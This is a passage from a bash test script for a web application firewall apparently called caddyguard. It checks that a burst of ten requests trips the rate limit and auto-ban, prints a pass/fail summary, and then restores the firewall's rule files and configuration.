    printf "  PASS  %-45s\n" "cc_rate error logged"; PASS=$((PASS+1))
else
    printf "  FAIL  %-45s\n" "cc_rate error logged"; FAIL=$((FAIL+1))
    ERRORS="$ERRORS\n  cc_rate error not logged"
fi

echo ""
echo "=== 25. CC attack detection ==="
cat > $RULE_DIR/config.json << 'EOF'
{"waf_enable":"on","trust_proxy_headers":"on","log_dir":"/tmp","white_url_check":"on","white_ip_check":"on","white_ua_check":"on","black_ip_check":"on","url_check":"on","url_args_check":"on","user_agent_check":"on","cookie_check":"on","cc_check":"on","cc_rate":"5/60","cc_block_ttl":300,"post_check":"on","referer_check":"off","file_upload_check":"on","bodyless":"on","multipart_streaming_check":"off","upload_filename_scan_limit":0,"post_body_scan_limit":2097152,"waf_output":"html","waf_redirect_url":""}
EOF
sleep 3
echo "  Sending 10 fast requests (CC limit 5/60s)..."
cc_pass=0
cc_block=0
for i in $(seq 1 10); do
    code=$(curl -s -m 3 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" "$TARGET/")
    if [ "$code" = "200" ]; then cc_pass=$((cc_pass+1))
    elif [ "$code" = "403" ]; then cc_block=$((cc_block+1)); fi
done
if [ "$cc_pass" -le 5 ] && [ "$cc_block" -ge 5 ]; then
    printf "  PASS  %-45s (pass=%d, block=%d)\n" "CC attack detection" "$cc_pass" "$cc_block"; PASS=$((PASS+1))
else
    printf "  FAIL  %-45s (pass=%d, block=%d)\n" "CC attack detection" "$cc_pass" "$cc_block"; FAIL=$((FAIL+1))
    ERRORS="$ERRORS\n  CC attack: pass=$cc_pass, block=$cc_block"
fi
code=$(curl -s -m 3 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" "$TARGET/")
if [ "$code" = "403" ]; then
    printf "  PASS  %-45s (HTTP %s)\n" "CC auto-ban active" "$code"; PASS=$((PASS+1))
else
    printf "  FAIL  %-45s (got %s)\n" "CC auto-ban active" "$code"; FAIL=$((FAIL+1))
fi

echo ""
echo "========================================"
echo "  Test Summary"
echo "  PASS: $PASS"
echo "  FAIL: $FAIL"
echo "========================================"
if [ $FAIL -gt 0 ]; then
    echo -e "Failed:$ERRORS"
fi

# Restore
cp /tmp/blackip.rule.bak $RULE_DIR/blackip.rule 2>/dev/null || true
cp /tmp/whiteip.rule.bak $RULE_DIR/whiteip.rule 2>/dev/null || true
cp /tmp/cdnip.rule.bak $RULE_DIR/cdnip.rule 2>/dev/null || true
cat > $RULE_DIR/config.json << 'EOF'
{"waf_enable":"on","trust_proxy_headers":"on","log_dir":"/var/log/caddyguard","url_check":"on","url_args_check":"on","post_check":"on","user_agent_check":"on","cookie_check":"on","cc_check":"on","cc_rate":"60/60","cc_block_ttl":600,"white_ip_check":"on","white_ua_check":"on","white_url_check":"on","black_ip_check":"on","referer_check":"off","file_upload_check":"on","bodyless":"on","multipart_streaming_check":"off","upload_filename_scan_limit":0,"post_body_scan_limit":2097152,"waf_output":"html","waf_redirect_url":"https://www.waf.com"}
EOF

kill $(pgrep -x caddy) 2>/dev/null || true
echo ""
echo "Done!"